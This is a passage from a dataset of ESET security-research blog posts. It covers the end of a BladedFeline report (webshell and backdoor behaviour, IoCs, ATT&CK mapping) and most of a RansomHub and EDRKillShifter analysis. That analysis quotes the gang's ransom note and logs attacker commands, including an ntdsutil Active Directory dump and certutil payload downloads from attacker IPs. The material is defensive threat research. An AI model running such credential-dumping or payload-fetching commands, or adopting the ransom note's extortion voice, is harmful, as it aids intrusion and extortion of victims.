believe it was deployed by BladedFeline to the victim in the Iraq government.\nFlog, so named for its filename – flogon.aspx – looks for specific input from the BladedFeline operators of the form Flog hashes the password, which must match the MD5 checksum 4CC88CE123B0DA8D75C0FE66A39339F6.\nVariables (a|b|c|d) are command options: - a returns, for the path provided, a directory listing and the byte length of each file, - b creates a file on disk, using the path provided, - c splits the path variable on a pipe and writes a file to disk where the first part of the path is the filename and the second part is the data to write, and - d deletes a specified file given in the supplied path.\nHawking Listener Hawking Listener, so named for its PDB string – C:\\Users\\g18u04\\source\\repos\\Hawking\\Hawking\\obj\\Release\\listner.pdb – is a 32-bit .NET/C# Windows binary with a timestomped compilation time of 2057-11-14 16:59:12.\nIt was also uploaded to VirusTotal by the same user who uploaded Flog and is probably a BladedFeline tool.\nIt implements the .NET HTTPListener class to set up a listener with a hardcoded URL (which we cannot disclose in this case without revealing the identity of the victim).\nAlternatively, Hawking can be provided at runtime with URLs for the listener socket to monitor.\nHawking listens for a provided QueryString (from a BladedFeline operator) with snmflwkejrhgsey as the key in the key-value pair.\nOnce received, Hawking executes the value in cmd.exe and returns the output.\nTo stop Hawking, operators need only send stop as the key in the QueryString with a non-null variable in the value.\nHawking logs all interactions, runtime arguments, and command output to the file log.txt in its working directory.\nP.S. Olala P.S. Olala is a 32-bit .NET binary named for its intended function (executing PowerShell scripts) and its PDB path G:\\csharp\\psExecuterService\\ewsService\\obj\\Release\\Olala.pdb.\nIt does not accept any runtime arguments.\nRather, at runtime, P.S. Olala uses the Run(ServiceBase[]) method of the .NET ServiceBase class to register itself as a service with the Service Control Manager (for persistence).\nWhen the P.S. Olala service is called, it spawns a thread and executes the function mainLoop, shown in Figure 6.\nEssentially, P.S. Olala is an executor of the PowerShell script stored in %APPDATA%\\Local\\Microsoft\\InputPersonalization\\TrainedDataStore.ps1.\nUnfortunately, we were unable to collect any of the TrainedDataStore.ps1 scripts.\nHowever, contextual information indicates it is likely an executor of the Whisper backdoor, or one of the reverse tunnels (Laret or Pinar).\nThe entire flow (P.S. Olala → TrainedDataStore → Whisper/Laret/Pinar) is probably an elongated persistence chain aiming to maintain access.\nSheep Tunneler Sheep Tunneler, a custom tunneling application that we named based on the PDB string C:\\Users\\sheep\\source\\repos\\MP\\MP\\obj\\Release\\MP.pdb), has been observed in the two following locations: - %APPDATA%\\Local\\Microsoft\\Windows\\Ringtones\\RingService.exe - %APPDATA%\\Local\\Microsoft\\Windows\\Shell\\mspsrv.exe Sheep Tunneler can be executed in two modes: network tunneling (by using the runtime argument middle) or connect back (by using the arguments cb Whisper Protocol Whisper Protocol, so named for its filename (Protocol.pdf.exe) is a 64-bit Python-compiled Windows binary with a compilation timestamp of 2024-03-11 09:01:20.\nIt creates a folder in C:\\ProgramData\\VeeamUpdate and writes both Whisper and its configuration file to that folder.\nWhisper Protocol also copies itself to %APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VeeamUpdate.lnk for persistence.\nFinally, it executes Whisper and exits gracefully.\nConclusion BladedFeline is an advanced threat group that specializes in targeting Iraqi and Kurdish victims, specifically governmental officials and organizations.\nWe assess that the group is likely a subgroup of OilRig.\nWe expect to find that BladedFeline will persist with implant development in order to maintain and expand access within its compromised victim set, likely for cyberespionage.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | Detection | Description | | 01B99FF47EC6394753F9 | Avamer.pdf.exe | Python/Trojan | Python-compiled dropper for Spearal | | 1C757ACCBC2755E83E53 | Win_Updates.exe | MSIL/Agent.\nEUM | Spearal, a BladedFeline backdoor.\n| | 272CF34E8DB2078A3170 | scr8B45.ps1 | PowerShell/Trojan | PowerShell script to install Spearal.\n| | 37859E94086EC47B3665 | ncms_demo.msi | MSIL/Agent.\nEUM | MSI inside the zip archive that drops and executes a PowerShell script that in turn drops and executes Spearal.\n| | 3D21E1C9DFBA38EC6997 | flogon.aspx | ASP/Agent.\nBI | Flog webshell.\n| | 4954E8ACE23B48EC55F1 | winsmsrv.exe | MSIL/HackTool | Pinar, a reverse tunnel.\n| | 562E1678EC8FDC1D83A3 | LogonUl.exe | Win64/OilRig_ | RDAT backdoor.\n| | 66BD8DB40F4169C7F0FC | Protocol.pdf.exe | Python/Trojan | Whisper Protocol, the dropper that writes and executes the Whisper backdoor.\n| | 6973D3FF8852A3292380 | VeeamUpdate.exe | MSIL/Agent.\nERR | Whisper backdoor.\n| | 73D0FAA475C6E489B2C5 | winhttpproxy.exe | MSIL/HackTool | Pinar, a reverse tunnel.\n| | B8AFC21EF2AA854896B9 | RunExeActionAllowed | MSIL/Agent.\nERR | Whisper backdoor.\n| | BB4FFCDBFAD40125080C | MFTD.exe | MSIL/Tiny.\nGL | Hawking Listener.\n| | BE0AD25B7B4834798490 | videosrv.exe | Generik.\nBKYYERR | VideoSRV, a reverse shell.\n| | E8E6E6AFEF3F574C1F52 | wincapsrv.exe | MSIL/HackTool | Laret, a reverse tunnel.\n| | F28D8C5C2283019E6ED7 | N/A | MSIL/Agent.\nEUM | Zip archive that contains an MSI that drops and executes a PowerShell script that in turn drops and executes Spearal.\n| Network | IP | Domain | Hosting provider | First seen | Details | | 178.209.51[.]61 | N/A | Nine Internet Solutions AG | 2023‑12‑18 | Distribution server for BladedFeline’s Laret reverse tunnel.\n| | 185.76.78[.]177 | N/A | EDIS GmbH - Noc Engineer | N/A | C&C used by Spearal.\n| MITRE ATT&CK techniques This table was built using version 17 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Reconnaissance | T1595.002 | Active Scanning: Vulnerability Scanning | BladedFeline probably conducts vulnerability scanning against targets to identify potentially vulnerable, exposed applications.\n| | Resource Development | T1583.001 | Acquire Infrastructure: Domains | BladedFeline registers domains to use for C&C servers.\n| | T1583.003 | Acquire Infrastructure: Virtual Private Server | BladedFeline uses VPS services to host C&C servers.\n| | | T1583 | Acquire Infrastructure | BladedFeline uses IPs for network infrastructure, including distributing malware and C&C servers.\n| | | T1586.002 | Compromise Accounts: Email Accounts | BladedFeline uses compromised email accounts as C&C servers.\n| | | Initial Access | T1190 | Exploit Public-Facing Application | BladedFeline probably exploits vulnerable public-facing applications for initial access.\n| | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | BladedFeline uses the Windows Command Shell to execute commands on compromised endpoints.\n| | T1059.007 | Command and Scripting Interpreter: JavaScript | BladedFeline uses JavaScript webshells to execute commands on compromised endpoints.\n| | | T1059.001 | Command and Scripting Interpreter: PowerShell | BladedFeline uses PowerShell to execute commands on compromised endpoints.\n| | | T1059.006 | Command and Scripting Interpreter: Python | BladedFeline uses Python as a dropper for deploying backdoors to compromised endpoints.\n| | | T1559 | Inter-Process Communication | BladedFeline uses IPC as a means of local code execution in its malicious IIS module.\n| | | T1569.002 | System Services: Service Execution | BladedFeline uses Windows services for malware execution with Whisper and PrimeCache.\n| | | Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | The Whisper backdoor creates a LNK file in the startup folder for persistence.\n| | T1546 | Event Triggered Execution | PrimeCache is loaded by an IIS Worker Process (w3wp.exe) when the IIS server receives an inbound HTTP request.\n| | | Defense Evasion | T1078 | Valid Accounts | BladedFeline uses legitimate accounts to exfiltrate data and bypass defenses, and as C&C servers.\n| | T1140 | Deobfuscate/Decode Files or Information | The Whisper backdoor uses base64 encoding to obfuscate data.\n| | | T1070.004 | Indicator Removal: File Deletion | The Python dropper for Whisper deletes itself and other install files after a successful installation.\n| | | T1070.006 | Indicator Removal: Timestomp | BladedFeline routinely timestomps the compilation timestamps of malware that the group develops.\n| | | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | BladedFeline dumps LSASS from memory to steal credentials.\n| | Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | The Whisper backdoor uses AES encryption to send and receive data between the malware and the C&C. | | T1071.001 | Application Layer Protocol: Web Protocols | PrimeCache uses standard web protocols for communication with the C&C server.\n| | | T1132.001 | Data Encoding: Standard Encoding | PrimeCache uses standard encoding for communication with the C&C server.\n| | | T1573.002 | Encrypted Channel: Asymmetric Cryptography | PrimeCache uses RSA and AES-CBC for C&C communication.\n| | | T1105 | Ingress Tool Transfer | PrimeCache has the capability to download additional files from the C&C server for local execution.\n| | | Exfiltration | T1048.001 | Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol | The Whisper backdoor uses AES encryption and email inboxes to send and receive data between the malware and the C&C. | | T1041 | Exfiltration Over C2 Channel | PrimeCache exfiltrates data to a C&C server.\n|","num_sentences":293,"metadata":{"source":"blog","platform":"welivesecurity","filename":"BladedFeline"}}
{"id":202,"title":"Shifting the sands of RansomHub’s EDRKillShifter","publish_date":"2025-03-26","link":"https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/","clean_text":"ESET researchers take a look back at the significant changes in the ransomware ecosystem in 2024 and focus on the newly emerged and currently dominating ransomware-as-a-service (RaaS) gang, RansomHub.\nWe share previously unpublished insights into RansomHub’s affiliate structure and uncover clear connections between this newly emerged giant and well-established gangs Play, Medusa, and BianLian.\nWe also emphasize the emerging threat of EDR killers, unmasking EDRKillShifter, a custom EDR killer developed and maintained by RansomHub.\nWe have observed an increase in ransomware affiliates using code derived from publicly available proofs of concept, while the set of drivers being abused is largely fixed.\nFinally, based on our observations following the law-enforcement-led Operation Cronos and the demise of the infamous BlackCat gang, we offer our insights into how to assist in this intensive fight against ransomware.\nKey points of this blogpost: - We discovered clear links between the RansomHub, Play, Medusa, and BianLian ransomware gangs. -\nWe achieved this by following the trail of tooling that RansomHub offers its affiliates. -\nWe document additional findings about EDRKillShifter, correlating our observations with RansomHub’s public activity. -\nWe offer insights into the emerging threat of EDR killers, their anatomy, and their role in the ransomware world.\nOverview The fight against ransomware reached two milestones in 2024: LockBit and BlackCat, formerly the top two gangs, dropped out of the picture.\nAnd for the first time since 2022, recorded ransomware payments dropped, in particular by a stunning 35% despite reverse expectations in the middle of the year.\nOn the other hand, the recorded number of victims posted on dedicated leak sites (DLSs) increased by roughly 15%.\nA big part of this increase is due to RansomHub, a new RaaS gang that emerged around the time of Operation Cronos.\nIn this blogpost, we look in depth at RansomHub and demonstrate how we leveraged to our advantage the way affiliates use RansomHub’s tooling, allowing us to draw connections between RansomHub and its rivals, including well-established ones like Play, Medusa, and BianLian.\nThroughout this blogpost, we refer to entities forming the ransomware-as-a-service model as follows: - Operators, who develop the ransomware payload, maintain the DLS, and offer services to affiliates, usually for a monthly fee and a percentage of the ransom payment (typically 5–20%). -\nAffiliates, who rent ransomware services from operators, and deploy the encryptors to victims’ networks and commonly also practice data exfiltration.\nThe rise of RansomHub RansomHub announced its first victim on its DLS (see Figure 1) on February 10th, 2024, 10 days before the public announcement of Operation Cronos.\nWhile the gang’s rise was slow, it was also consistent, and when – in April 2024 – RansomHub achieved the most victim postings of all active ransomware groups (disregarding LockBit posting fakes), it was clear that this was a gang to keep a close eye on.\nSince then, RansomHub has dominated the ransomware scene.\nTo further demonstrate how dangerous RansomHub is, let’s compare it to LockBit.\nFigure 2 shows the daily cumulative sum (on the y-axis) of new victims posted on the DLS of LockBit vs. RansomHub, starting from RansomHub’s appearance in February 2024.\nAs you can clearly see, while RansomHub started announcing victims more slowly, nearly nine months later the gang was able to accumulate more victims since it started than LockBit, and that trend continues to this day.\nConsidering that both BlackCat and LockBit suffered huge blows right around the time RansomHub emerged, we can confidently assume that many skilled affiliates migrated to RansomHub; Notchy, the BlackCat affiliate who stole more than 4 TB of data from Change Healthcare, is just one publicly known example.\nFigure 3 shows the ransom note that RansomHub affiliates leave on their victims’ machines.\nWe are the RansomHub.\nYour company Servers are locked and Data has been taken to our servers.\nThis is serious.\nGood news: - your server system and data will be restored by our Decryption Tool, we support trial decryption to prove that your files can be decrypted; - for now, your data is secured and safely stored on our server; - nobody in the world is aware about the data leak from your company except you and RansomHub team; - we provide free trial decryption for files smaller than 1MB.\nIf anyone claims they can decrypt our files, you can ask them to try to decrypt a file larger than 1MB.\nFAQs: Who we are? -\nNormal Browser Links: https://ransomxifxwc5eteopdobynonjctkxxvap77yqifu2emfbecgbqdw6qd.onion.ly/ - Tor Browser Links: http://ransomxifxwc5eteopdobynonjctkxxvap77yqifu2emfbecgbqdw6qd.onion/ Want to go to authorities for protection? -\nSeeking their help will only make the situation worse,They will try to prevent you from negotiating with us, because the negotiations will make them look incompetent,After the incident report is handed over to the government department, you will be fined ,The government uses your fine to reward them.\nAnd you will not get anything, and except you and your company, the rest of the people will forget what happened!!!!!\nThink you can handle it without us by decrypting your servers and data using some IT Solution from third-party \"specialists\"? -\nthey will only make significant damage to all of your data; every encrypted file will be corrupted forever.\nOnly our Decryption Tool will make decryption guaranteed; Don't go to recovery companies, they are essentially just middlemen who will make money off you and cheat you. -\nWe are well aware of cases where recovery companies tell you that the ransom price is 5 million dollars, but in fact they secretly negotiate with us for 1 million dollars, so they earn 4 million dollars from you.\nIf you approached us directly without intermediaries you would pay 5 times less, that is 1 million dollars.\nThink your partner IT Recovery Company will do files restoration? -\nno they will not do restoration, only take 3-4 weeks for nothing; besides all of your data is on our servers and we can publish it at any time; as well as send the info about the data breach from your company servers to your key partners and clients, competitors, media and youtubers, etc.\nThose actions from our side towards your company will have irreversible negative consequences for your business reputation.\nYou don't care in any case, because you just don't want to pay? -\nWe will make you business stop forever by using all of our experience to make your partners, clients, employees and whoever cooperates with your company change their minds by having no choice but to stay away from your company.\nAs a result, in midterm you will have to close your business.\nSo lets get straight to the point.\nWhat do we offer in exchange on your payment: - decryption and restoration of all your systems and data within 24 hours with guarantee; - never inform anyone about the data breach out from your company; - after data decryption and system restoration, we will delete all of your data from our servers forever; - provide valuable advising on your company IT protection so no one can attack your again.\n``` Now, in order to start negotiations, you need to do the following: - install and run 'Tor Browser' from https://www.torproject.org/download/ - use 'Tor Browser' open http://ubfofxonwdb32wpcmgmcpfos5tdskfizdft6j54l76x3nrwu2idaigid.onion/ - enter your Client ID: [REDACTED] * do not leak your ID or you will be banned and will never be able to decrypt your files.\nThere will be no bad news for your company after successful negotiations for both sides.\nBut there will be plenty of those bad news if case of failed negotiations, so don't think about how to avoid it.\nJust focus on negotiations, payment and decryption to make all of your problems solved by our specialists within 1 day after payment received: servers and data restored, everything will work good as new. ************************************************\nFigure 3.\nRansomHub ransom note Recruiting phase Just as any emerging RaaS gang, RansomHub needed to attract affiliates, and since there is strength in numbers, the operators weren’t very picky.\nThe initial advertisement was posted on the Russian-speaking RAMP forum on February 2nd, 2024, eight days before the first victims were posted.\nThere are a few things to note about the initial announcement: - Affiliates can receive ransoms with their own wallet and then afterward pay the operator. -\nAffiliates get to keep 90% of the ransom. -\nThe encryptor is obfuscated and supports Windows, Linux, and ESXi platforms. -\nRansomHub offers various ways to enter its RaaS program: - Recommendation by an existing affiliate. -\nProof of reputation. -\nEvidence of past RaaS cooperation. -\nPaying a deposit that is returned after first successful payment. -\nAttacking Commonwealth of Independent States, Cuba, North Korea, and China is prohibited. -\nPreferred communication is over qTox using the ID 4D598799696AD5399FABF7D40C4D1BE9F05D74CFB311047D7391AC0BF64BED47B56EEE66A528.\nGuarantees like receiving ransom payment directly to the affiliate’s wallet and keeping a generous 90% certainly sound promising, especially in the chaos following the BlackCat and LockBit disruptions.\nAdditionally, the entry barrier is very low, allowing even low-skilled affiliates to try their luck.\nIt is also worth mentioning that RansomHub’s encryptor is not written from scratch, but based on repurposed code from Knight, a once-rival ransomware gang that sold its source code in February 2024.\nThe affiliates request the encryptor (often called a locker by RaaS operators) through the web panel offered by RansomHub (as is typical for RaaS gangs); the component responsible for generating the encryptor is typically referred to as a builder.\nBecause information such as the unique victim ID is hardcoded in the encryptor, an affiliate needs to request a new one for every victim.\nRansomHub’s builder adds an additional layer of protection to its encryptors, a 64-character password, without which the encryptor does not work.\nThis password is unique for each sample, generated by the builder, and known only to the affiliate who requested the encryptor.\nOn June 21st, 2024, RansomHub operators changed the affiliate rules in reaction to an alleged breach by security researchers.\nIn response, the operator no longer allowed vouching by existing members as sufficient and strictly required a US$ 5,000 deposit for aspiring affiliates.\nThis was the last noteworthy message from the RansomHub operators.\nHowever, between the initial announcement and this rule change, one more important event happened, which we dive into in the next section.\nExpanding the arsenal – EDRKillShifter On May 8th, 2024, the RansomHub operators made a significant update – they introduced their own EDR killer, a special type of malware designed to terminate, blind, or crash the security product installed on a vicim’s system, typically by abusing a vulnerable driver.\nRansomHub’s EDR killer, named EDRKillShifter by Sophos, is a custom tool developed and maintained by the operator.\nEDRKillShifter is offered to RansomHub affiliates through the web panel, same as the encryptor; it too is protected by a 64-character password.\nFunctionality-wise, it is a typical EDR killer targeting a large variety of security solutions that the RansomHub operators expect to find protecting the networks they aim to breach.\nA notable distinction lies in the code protection – the password protects shellcode that acts as a middle layer of the killer’s execution.\nWithout the password, security researchers can neither retrieve the list of targeted process names nor the abused vulnerable driver.\nSophos probably chose “shifter” in the name to reflect the fact that the abused driver is not always the same – at least two different vulnerable drivers (abused by other known EDR killers too) were observed.\nWe dive more in depth into EDRKillShifter and other EDR killers in the EDR killers on the rise section.\nThe decision to implement a killer and offer it to affiliates as part of the RaaS program is rare.\nAffiliates are typically on their own to find ways to evade security products – some reuse existing tools, while more technically oriented ones modify existing proofs of concept or utilize EDR killers available as a service on the dark web.\nEvidently, ransomware affiliates thought this was a good idea, because soon after the announcement, ESET researchers saw a steep increase in the use of EDRKillShifter, and not exclusively in RansomHub cases, as we demonstrate in the next section.\nRoughly a month after EDRKillShifter’s announcement, on June 3rd, 2024, RansomHub operators posted yet another update, stating that they improved EDRKillShifter.\nESET telemetry shows that some affiliates deployed this updated version only four days later.\nLeveraging EDRKillShifter ESET researchers took advantage of the wide popularity that EDRKillShifter gained upon its launch to expand our research.\nWe were able to leverage its usage to associate RansomHub affiliates with the multiple rival gangs that they also work for, as well as to retrieve clearer internal versioning of this EDR killer.\nLinking affiliates to rival gangs The difference between RansomHub’s encryptor and EDRKillShifter is that there is no reason for affiliates to build a new sample of EDRKillShifter for every intrusion (unless there is a major update) – which is exactly what allowed us to uncover one of RansomHub’s affiliates working for three rival gangs – Play, Medusa, and BianLian.\nThese three gangs differ significantly: - BianLian focuses mostly on extortion-only attacks, with no RaaS program offering on its DLS. -\nMedusa does not offer a RaaS program on its DLS either, but advertises its RaaS program on the RAMP underground forum. -\nPlay strictly denies ever running a RaaS program on its DLS.\nDiscovering a link between RansomHub and Medusa is not that surprising, as it is common knowledge that ransomware affiliates often work for multiple operators simultaneously.\nHowever, we did not expect well-established gangs operating under the closed RaaS model (meaning that they do not actively look for new recruits and their partnerships are based on long-term mutual trust) to form alliances with RansomHub so quickly.\nOther well-established gangs, in addition to BianLian and Play, also operate under the closed RaaS model – the recent BlackBasta leak offered unique insight into the inner workings of such groups.\nOne way to explain Play and BianLian having access to EDRKillShifter is that they hired the same RansomHub affiliate, which is unlikely given the closed nature of both gangs.\nAnother, more plausible explanation is that trusted members of Play and BianLian are collaborating with rivals, even newly emerged ones like RansomHub, and then repurposing the tooling they receive from those rivals in their own attacks.\nThis is especially interesting, since such closed gangs typically employ a rather consistent set of core tools during their intrusions.\nBefore diving into the specifics of the discovered overlaps, let’s briefly introduce the modus operandi of the Play gang.\nPlay’s modus operandi The Play gang posted the first victims to its DLS on November 26th, 2022; the gang has shown steady growth since then.\nIn April 2024, Play made it to the top three most active ransomware gangs on the scene and consistently remained in the top 10 for the whole year.\nThe gang posts 25 new victims each month, on average, focusing on SMBs, hinting that the gang has at least several experienced, loyal affiliates.\nRecently, Play has been linked to the North Korea-aligned group Andariel.\nAs expected from a closed RaaS gang, most cases involving the Play encryptor show similarities.\nTypically, in such intrusions: - the encryptors are stored in %PUBLIC%\\Music\\<6_random_alphanumeric_characters>.exe, - SystemBC is utilized for payload delivery and serves as a proxy, - Grixba, a custom network scanner, is often used, and - additional tooling is often downloaded directly from an IP address.\nThe remainder of the attack typically employs a wide arsenal of tools, as well as living-off-the-land techniques.\nThe puzzle Let’s look in depth at the links we discovered.\nWe emphasize first the most important ones in Figure 4 and then dive into the details of each of the intrusions.\nWe believe with high confidence that all these attacks were performed by the same threat actor, working as an affiliate of the four ransomware gangs shown in Figure 4.\nWe are not tracking this threat actor under a dedicated name at this point, but for convenience, we’ll refer to this threat actor as QuadSwitcher.\nAs you can see in Figure 4, there are a total of five intrusions from four different ransomware gangs interlinked by: - two EDRKillShifter samples (SHA-1: BF84712C5314DF2AA851B8D4356EA51A9AD50257 and 77DAF77D9D2A08CC22981C004689B870F74544B5), - the payload delivery server 45.32.206[.]169 hosting EDRKillShifter and WKTools (a utility to explore and modify the Windows kernel, used in many Play intrusions), and - SystemBC with C&C server 45.32.210[.]151.\nThe following sections go into the individual intrusions in more detail.\nRansomHub In July 2024, QuadSwitcher deployed the RansomHub encryptor along with EDRKillShifter (SHA-1: BF84712C5314DF2AA851B8D4356EA51A9AD50257) to a manufacturing company in Western Europe and an automotive company in Central Europe.\nIn August, QuadSwitcher compromised a governmental institution in North America using PuTTY, and shortly after Rclone.\nThey proceeded by installing AnyDesk and protecting it with a password via a PowerShell script, anydes.ps1 (part of the Conti leaks).\nAttempting to evade the security solution, the threat actor deployed EDRKillShifter (SHA-1: BF84712C5314DF2AA851B8D4356EA51A9AD50257) and TDSSKiller.\nBianLian At the end of July 2024, QuadSwitcher compromised a company in the legal sector in North America.\nDuring that intrusion, the threat actor dumped the Active Directory by executing powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp1' q q\", deployed AnyDesk via the same installation script from the Conti leaks, and used Advanced IP Scanner to scan the network.\nSix days later, the attacker installed the ScreenConnect and Ammyy Admin remote monitoring and management (RMM) tools and deployed EDRKillShifter (SHA-1: BF84712C5314DF2AA851B8D4356EA51A9AD50257).\nAfter almost a month of no activity, the attacker returned and downloaded two payloads from http://45.32.206[.]169/: - WKTools.exe, the WKTools, utility often used by Play - Killer.exe, an instance of EDRKillShifter (SHA-1: 77DAF77D9D2A08CC22981C004689B870F74544B5) Additionally, QuadSwitcher deployed SystemBC using 45.32.210[.]151 as its C&C server, and a signature BianLian backdoor with C&C server 92.243.64[.]200:6991 from http://149.154.158[.]222:33031/win64_1.exe.\nThe victim was later announced on BianLian’s DLS.\nPlay In early August 2024, QuadSwitcher compromised a manufacturing company in North America.\nThey deployed SystemBC with C&C 45.32.210[.]151, EDRKillShifter (SHA-1: 77DAF77D9D2A08CC22981C004689B870F74544B5), and WKTools, downloaded from http://45.32.206[.]169/WKTools.exe.\nUltimately, the threat actor deployed the Play encryptor.\nMedusa At the end of August 2024, QuadSwitcher compromised a technology company in Western Europe, downloading PuTTY from http://130.185.75[.]198:8000/plink.exe using certutil.exe, followed by using Process Explorer and EDRKillShifter (SHA-1: BF84712C5314DF2AA851B8D4356EA51A9AD50257).\nThe threat actor also downloaded MeshAgent from http://79.124.58[.]130/dl/git.exe, also via certutil.exe.\nThe victim was later announced on Medusa’s DLS.\nThe puzzle – conclusion Besides the links summarized in Figure 4, there are TTPs that most resemble typical Play intrusions.\nIn three of the cases, additional malware and tools were downloaded from a root folder of a server accessed via an IP address using HTTP and QuadSwitcher also used SystemBC, commodity malware heavily used by the Play gang.\nThese links lead us to believe QuadSwitcher is related to Play the closest.\nAdditionally, QuadSwitcher has access to at least two EDRKillShifter samples, compiled two months apart, signaling the threat actor had extended access to RansomHub’s tooling.\nReconstructing EDRKillShifter development timeline In September 2024, ESET researchers documented a case where CosmicBeetle, an immature ransomware threat actor using its own signature encryptor, ScRansom, and the leaked LockBit 3.0 builder, became an affiliate of RansomHub.\nNote that CosmicBeetle is not a gang, but an individual distributing and developing various ransomware.\nFollowing the publication of our findings, we observed CosmicBeetle further utilize EDRKillShifter during: - a RansomHub attack against a hospitality company in South America in August 2024, - a fake LockBit attack against an automotive company in Central Europe in August 2024, - a fake LockBit attack against a manufacturing company in East Asia in September 2024, and - an attack with no encryptor deployed against an unknown company in the Middle East in January 2025.\nOther immature ransomware affiliates were spotted using EDRKillShifter before deploying their custom encryptors (often created simply by using the leaked LockBit 3.0 builder) as well.\nThis shows one weakness of RansomHub – in its greed to grow as quickly as possible, it wasn’t very picky about its affiliates.\nAs a result, it was, by its own admission, breached by security researchers in June 2024.\nAdditionally, immature affiliates tend to leave significantly more trails, which enabled us to learn more about both them and RansomHub.\nIn the blogpost about CosmicBeetle, we mentioned EDRKillShifter being deployed from an unusual path C:\\Users\\Administrator\\Music\\1.0.8.zip.\nIn the following months, multiple other immature affiliates left similar trails that enabled us to partially reconstruct EDRKillShifter’s versioning, demonstrated in Table 1.\nThe VERSIONINFO column refers to EDRKillShifter’s version as listed in its VERSIONINFO resource, while the Deployment path refers to the version mentioned in the path discovered by ESET telemetry.\nTable 1.\nEDRKillShifter versioning | Compilation date | VERSIONINFO | Deployment path | | 2024-05-01 | 1.2.0.1 | N/A | | 2024-06-06 | 1.2.0.1 | 1.0.7 / 1.0.8 | | 2024-06-07 | 1.6.0.1 | 2.0.1 | | 2024-07-10 | 2.6.0.1 | 2.0.4 | | 2024-07-24 | 2.6.0.1 | 2.0.5 | Following July 2024, there was only a single very generic update from the RansomHub operator posted on RAMP, correlating with our not seeing new versions of EDRKillShifter in the wild.\nReconstructing the development timeline of EDRKillShifter also allowed us to spot these development practices: - The InternalName property of the version info resource being either Config.exe or Loader.exe. -\nThe OriginalName property of the version info resource always being Loader.exe. -\nThe deployment filename varying, most commonly being Killer.exe, Magic.exe, or Loader.exe. -\nThe name of the argument accepting the 64-character-long password being named either pass or key.\nEDR killers on the rise EDRKillShifter quickly gained popularity among ransomware affiliates, and as we just demonstrated, they don’t use it exclusively in RansomHub intrusions.\nHowever, it is not the only EDR killer out there; in fact, ESET researchers have observed an increase in the variety of EDR killers used by ransomware affiliates.\nAn EDR killer is malware designed to run in a compromised network, to blind, corrupt, crash, or terminate security solutions protecting the endpoints.\nThe obvious goal is to allow smooth execution of the ransomware encryptor.\nWhile more immature ransomware affiliates settle with scripts that simply try to terminate a list of processes, more sophisticated ones go beyond that and use the technique known as Bring Your Own Vulnerable Driver (BYOVD).\nEDR killers are an effective and increasingly popular addition to ransomware affiliates’ arsenals.\nDuring an intrusion, the goal of the affiliate is to obtain admin or domain admin privileges.\nRansomware operators tend not to do major updates of their encryptors too often due to the risk of introducing a flaw that could cause issues, ultimately damaging their reputation.\nAs a result, security vendors detect the encryptors quite well, which the affiliates react to by using EDR killers to “get rid of” the security solution just before executing the encryptor.\nAnatomy of an EDR killer Advanced EDR killers consist of two parts – a user mode component responsible for orchestration (which we will refer to as the killer code) and a legitimate, but vulnerable, driver.\nThe execution is typically very straightforward – the killer code installs the vulnerable driver, typically embedded in its data or resources, iterates over a list of process names, and issues a command to the vulnerable driver, resulting in triggering the vulnerability and killing the process from kernel mode.\nFew drivers, many killers Sophos documented in their blogpost how different builds of EDRKillShifter abuse different vulnerable drivers.\nOne of the abused drivers, rentdrv2.sys, is also a part of BadRentdrv2, a publicly available EDR killer.\nThe second one, TFSysMon from ThreatFire System Monitor, is also a part of TFSysMon-Killer, another publicly available PoC. The latter is part of a bigger collection of four EDR killer PoCs written in Rust, which we have observed threat actors reimplement in C++ without changing a single line of code.\nWhile the Living Off The Land Drivers project provides over 1700 vulnerable drivers, making them a lucrative target for cybercriminals, only a handful of these drivers are abused by EDR killers – if there is tested code abusing a vulnerability in one of these drivers, it is much easier to reuse it without having to design the code from scratch.\nAdditionally, it allows the EDR killer developers to focus on the killer code and its stealthiness.\nGray zone of EDR killers Legitimate tools are abused by ransomware affiliates to work as EDR killers, too.\nSuch tools, like the GMER rootkit detector and PC Hunter, by their nature require access to kernel mode and need to closely inspect the internals of the operating system.\nUnfortunately, they also offer a powerful functionality that can be abused when in the hands of malicious threat actors.\nAdding EDR killers to RaaS offerings RaaS programs often don’t provide affiliates only with encryptors – additional tools and playbooks may be part of the package.\nFor instance, LockBit offered Stealbit, a custom data exfiltration tool, to its affiliates, and the Conti leaks and Dispossessor leak disclosed that playbooks, scripts, and know-how are also part of the ransomware gangs’ arsenal.\nAdding an EDR killer to a RaaS offering seems logical, and RansomHub is not the only gang doing that.\nIn October 2024, ESET researchers documented that the emerging ransomware gang Embargo implemented its own EDR killer as well, called MS4Killer, by modifying a publicly available PoC. At the time of writing: while the group listed only 14 victims on its DLS, it had already invested time and resources into developing its own EDR killer.\nIt remains to be seen whether EDR killers find their place in more gangs’ offerings.\nHowever, this blogpost has also demonstrated that researchers may leverage their usage to cluster affiliates and discover new relationships between rival gangs.\nDefeating EDR killers Defending against EDR killers is challenging.\nThreat actors need admin privileges to deploy an EDR killer, so ideally, their presence should be detected and mitigated before they reach that point.\nWhile preventing the killer code from executing is the best approach, code obfuscation can make this unreliable.\nHowever, focusing on vulnerable drivers provides additional defense options.\nESET considers drivers exploited by EDR killers potentially unsafe.\nTherefore, users, especially in corporate environments, should ensure that the detection of potentially unsafe applications is enabled.\nThis can prevent the installation of vulnerable drivers.\nAlthough not common, sophisticated threat actors may exploit a vulnerable driver already present on a compromised machine instead of relying on BYOVD.\nTo counter this, having proper patch management in place is an effective and essential defense strategy.\nConclusion The ransomware ecosystem suffered significant blows in 2024.\nDespite the overall number of recorded attacks increasing, it should not overshadow the positive effect of successfully disrupting or eliminating two ransomware gangs that had been dominating the scene for years.\nWe can speculate about how much the result of law enforcement actions decreased ransomware payments, or how the growing awareness and initiatives like the Counter Ransomware Initiative are helping ransomware victims understand that paying the ransom may not be the best way forward.\nWhat is clear, unfortunately, is that a new sophisticated ransomware group, RansomHub, emerged, used the right tactics to attract affiliates (many of whom we believe transitioned from BlackCat and LockBit) in a 